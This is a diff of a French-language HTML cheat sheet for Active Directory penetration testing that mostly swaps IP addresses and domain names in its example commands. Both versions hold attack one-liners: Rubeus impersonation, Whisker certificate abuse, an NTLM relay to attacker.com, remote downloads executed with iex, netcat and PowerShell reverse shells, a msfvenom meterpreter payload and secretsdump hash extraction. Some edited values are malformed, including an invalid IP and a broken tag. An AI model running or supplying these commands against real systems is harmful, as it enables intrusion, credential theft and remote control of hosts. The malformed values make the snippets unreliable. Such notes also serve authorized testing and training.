@@ -168,7 +168,7 @@ pre code {
                     <p>➡️ Ce module demande un TGT en fournissant les identifiants de l’utilisateur.</p>
             
                     <h3>🎯 Exemple 2 : S4U2Self + S4U2Proxy</h3>
-                    <pre><code>.\Rubeus.exe s4u /ticket:ticket.kirbi /msdsspn:cifs/dc.painters.htb /impersonateuser:DC$ /domain:painters.htb /altservice:CIFS,HOST,LDAP /ptt</code></pre>
+                    <pre><code>.\Rubeus.exe s4u /ticket:ticket.kirbi /msdsspn:cifs/dc.louico.mfr /impersonateuser:DC$ /domain:louico.mfr /altservice:CIFS,HOST,LDAP /ptt</code></pre>
                     <p>➡️ Ce module permet de s’authentifier en tant qu’un autre utilisateur via S4U2Self puis de faire une requête S4U2Proxy pour déléguer son identité.</p>
             
                     <h3>🎯 Exemple 3 : TGT Delegation</h3>
@@ -191,15 +191,15 @@ pre code {
                     <p>Whisker est un outil permettant de générer des certificats malveillants pour exploiter les failles des services ADCS (Active Directory Certificate Services).</p>
 
                     <h3>🎯 Exemple 1 : Génération d'un certificat malveillant</h3>
-                    <pre><code>whisker req -ca "http://10.10.10.10/certsrv/" -template "Machine" -altname "evil.com"</code></pre>
+                    <pre><code>whisker req -ca "http://192.168.09.10/certsrv/" -template "Machine" -altname "evil.com"</code></pre>
                     <p>➡️ Cette commande génère un certificat malveillant en abusant d'un modèle de certificat.</p>
 
                     <h3>🎯 Exemple 2 : Exploitation de l'authentification NTLM</h3>
-                    <pre><code>whisker relay -target "http://10.10.10.10/certsrv/" -listener "http://attacker.com"</code></pre>
+                    <pre><code>whisker relay -target "http://192.168.09.10/certsrv/" -listener "http://attacker.com"</code></pre>
                     <p>➡️ Cette commande configure un relais NTLM pour capturer les identifiants.</p>
 
                     <h3>🎯 Exemple 3 : Dump des certificats</h3>
-                    <pre><code>whisker dump -ca "http://10.10.10.10/certsrv/"</code></pre>
+                    <pre><code>whisker dump -ca "http://192.168.09.10/certsrv/"</code></pre>
                     <p>➡️ Cette commande extrait les certificats disponibles sur le serveur ADCS.</p>
                 </div>
             </div>
@@ -218,7 +218,7 @@ pre code {
             
                     <pre><code>
             powershell -ep bypass
-            iex (iwr http://10.10.14.15/PowerView.ps1 -UseBasicParsing)
+            iex (iwr http://192.168.23.11/PowerView.ps1 -UseBasicParsing)
             
             $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
             Set-DomainUserPassword -Domain painters.htb -Identity blake -AccountPassword $UserPassword -Verbose
@@ -226,7 +226,7 @@ pre code {
             
                     <p>Création d'un objet d'identification PowerShell :</p>
                     <pre><code>
-            $user = 'painters\blake'
+            $user = 'domain\user'
             $passwd = 'Password123!'
             $secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
             $cred = new-object system.management.automation.PSCredential ($user, $secpass)
@@ -243,14 +243,14 @@ pre code {
                     <pre><code>
             Invoke-Command -ComputerName PNT-SVRPSB -ScriptBlock {
                 mkdir c:\temp;
-                powershell iwr http://10.10.14.15/nc64.exe -O c:\temp\nc64.exe
+                powershell iwr http://192.168.23.11/nc64.exe -O c:\temp\nc64.exe
             } -Credential $cred
                     </code></pre>
             
                     <p>Envoi d’un reverse shell vers l’attaquant :</p>
                     <pre><code>
             Invoke-Command -ComputerName PNT-SVRPSB -ScriptBlock {
-                c:\temp\nc64.exe 10.10.14.15 443 -e cmd.exe
+                c:\temp\nc64.exe 192.168.23.11 443 -e cmd.exe
             } -Credential $cred
                     </code></pre>
                      <!-- 🔗 Lien GitHub -->
@@ -285,15 +285,15 @@ New-MachineAccount -MachineAccount "NewMachine" -Password $(ConvertTo-SecureStri
                     <p>Impacket est une collection de scripts Python permettant d'exploiter divers protocoles réseau comme SMB, RPC, et WinRM pour des attaques post-exploitation.</p>
 
                     <h3>🎯 Exemple 1 : Exécution de commandes via SMBExec</h3>
-                    <pre><code>python3 smbexec.py DOMAIN/username:password@10.10.10.10</code></pre>
+                    <pre><code>python3 smbexec.py DOMAIN/username:password@192.168.09.10/code></pre>
                     <p>➡️ Cette commande ouvre un shell interactif sur la machine cible en utilisant SMB.</p>
 
                     <h3>🎯 Exemple 2 : Dump des hashes NTLM avec secretsdump</h3>
-                    <pre><code>python3 secretsdump.py DOMAIN/username:password@10.10.10.10</code></pre>
+                    <pre><code>python3 secretsdump.py DOMAIN/username:password@192.168.09.10</code></pre>
                     <p>➡️ Cette commande extrait les hashes NTLM des comptes locaux et de domaine.</p>
 
                     <h3>🎯 Exemple 3 : Requête Kerberos avec GetUserSPNs</h3>
-                    <pre><code>python3 GetUserSPNs.py DOMAIN/username:password -dc-ip 10.10.10.10</code></pre>
+                    <pre><code>python3 GetUserSPNs.py DOMAIN/username:password -dc-ip 192.168.09.10</code></pre>
                     <p>➡️ Cette commande identifie les comptes avec SPN configurés et récupère leurs tickets Kerberos.</p>
                 </div>
             </div>
@@ -308,11 +308,11 @@ New-MachineAccount -MachineAccount "NewMachine" -Password $(ConvertTo-SecureStri
                     </p>
             
                     <h3>🎯 Exemple 1 : Connexion simple avec mot de passe</h3>
-                    <pre><code>evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!'</code></pre>
+                    <pre><code>evil-winrm -i 192.168.09.100 -u administrator -p 'Password123!'</code></pre>
                     <p>➡️ Connexion au shell PowerShell distant avec mot de passe clair.</p>
             
                     <h3>🎯 Exemple 2 : Connexion avec un certificat</h3>
-                    <pre><code>evil-winrm -i 10.10.10.100 -u administrator -k cert.pem -s key.pem</code></pre>
+                    <pre><code>evil-winrm -i 192.168.09.100 -u administrator -k cert.pem -s key.pem</code></pre>
                     <p>➡️ Utilisation d’un certificat et clé privée pour s’authentifier sans mot de passe.</p>
             
                     <h3>🎯 Exemple 3 : Upload d’un fichier vers la machine cible</h3>
@@ -335,7 +335,7 @@ New-MachineAccount -MachineAccount "NewMachine" -Password $(ConvertTo-SecureStri
                     </p>
             
                     <h3>🎯 Étape 1 : Génération du payload (machine attaquante)</h3>
-                    <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f exe -o shell.exe</code></pre>
+                    <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.11 LPORT=443 -f exe -o shell.exe</code></pre>
             
                     <h3>🎯 Étape 2 : Configuration du handler Metasploit</h3>
                     <pre><code>sudo msfconsole
@@ -386,7 +386,7 @@ sekurlsa::logonpasswords</code></pre>
                     <p>➡️ Cette commande exécute "whoami" avec des privilèges élevés, affichant "NT AUTHORITY\SYSTEM".</p>
 
                     <h3>🎯 Exemple 2 : Lancer un reverse shell</h3>
-                    <pre><code>SweetPotato.exe -c "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.15/shell.ps1')\""</code></pre>
+                    <pre><code>SweetPotato.exe -c "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.23.11/shell.ps1')\""</code></pre>
                     <p>➡️ Cette commande télécharge et exécute un script PowerShell pour établir un reverse shell.</p>
                 </div>
             </div>
@@ -422,7 +422,7 @@ sekurlsa::logonpasswords</code></pre>
                     <p>➡️ Cette commande met Netcat en mode écoute sur le port 4444, prêt à recevoir une connexion.</p>
 
                     <h3>🎯 Exemple 2 : Envoi d'un reverse shell</h3>
-                    <pre><code>nc 10.10.14.15 4444 -e /bin/bash</code></pre>
+                    <pre><code>nc 192.168.23.11 4444 -e /bin/bash</code></pre>
                     <p>➡️ Cette commande envoie un shell bash à l'adresse IP et au port spécifiés.</p>
 
                     <h3>🎯 Exemple 3 : Transfert de fichiers</h3>
@@ -430,7 +430,7 @@ sekurlsa::logonpasswords</code></pre>
 nc -l -p 1234 > received_file.txt
 
 # Machine envoyant le fichier
-nc 10.10.14.15 1234 < file_to_send.txt</code></pre>
+nc 192.168.23.11 1234 < file_to_send.txt</code></pre>
                     <p>➡️ Ces commandes transfèrent "file_to_send.txt" d'une machine à une autre.</p>
                 </div>
             </div>
